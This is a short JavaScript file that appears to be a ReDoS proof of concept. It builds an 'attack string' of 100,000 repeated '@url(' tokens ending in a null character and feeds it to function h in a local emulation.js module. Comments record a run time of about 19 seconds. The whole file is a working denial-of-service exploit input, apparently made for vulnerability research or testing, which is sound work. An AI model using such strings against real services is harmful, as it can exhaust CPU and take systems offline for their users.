"use strict";

var _emulation = require("./emulation.js");
//Attack String :""+"@url("*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "@url(";
}
str += "\0";
console.log((0, _emulation.h)(str));

// real    0m19.054s
// user    0m18.889s
// sys     0m0.010s